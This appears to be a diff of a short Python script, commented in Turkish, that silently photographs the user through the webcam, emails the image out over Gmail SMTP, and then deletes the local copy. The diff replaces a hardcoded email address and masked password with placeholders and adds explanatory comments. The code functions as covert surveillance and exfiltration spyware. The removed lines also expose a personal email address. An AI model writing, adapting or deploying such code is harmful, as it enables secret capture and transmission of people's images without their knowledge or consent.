@@ -5,20 +5,20 @@ from email.mime.image import MIMEImage
 from email.mime.base import MIMEBase
 import os
 import sys
-import time
+import time  # gerekli modülleri içe aktardık
 
 def func():
-    photo = cv2.VideoCapture(0)
-    time.sleep(1)
-    rt,image = photo.read()
-    cv2.imwrite("photo.jpg",image)
-    photo.release()
+    photo = cv2.VideoCapture(0) # burada bilgisayarın kamerasını kullanacağımız haber verdik 
+    time.sleep(1) # bir saniye bekledik aksi halde fotoğraf karanlık çıkar
+    rt,image = photo.read() # ardından aldığımız görseli okuduk
+    cv2.imwrite("photo.jpg",image) # daha sonra aldığımız görseli photo adıyla kaydetttik
+    photo.release() # kamerayı serbest bıraktık
     cv2.destroyAllWindows()
     photo_path = open(os.getcwd()+r"\photo.jpg",'rb').read()
 
     message = MIMEMultipart()
-    message["From"] = "tahayagma@gmail.com"
-    message["To"] = "tahayagma@gmail.com"
+    message["From"] = "Gönderen Mail"
+    message["To"] = "Alıcı Mail"
     message["Subject"] = "Gelen Veriler"
 
 
@@ -29,14 +29,14 @@ def func():
         mail = smtplib.SMTP("smtp.gmail.com",587)
         mail.ehlo()
         mail.starttls()
-        mail.login("tahayagma@gmail.com","***123***")
+        mail.login("mail adresiniz","mailinizin şifresi")
         mail.sendmail(message["From"],message["To"],message.as_string())
         mail.close()
     except:
         sys.stderr.write("hata")
         sys.stderr.flush()
     time.sleep(5)
-    os.system("del photo.jpg")
+    os.system("del photo.jpg") #5 saniye bekledikten sonta fotoğraf silinir
 
 
 func()
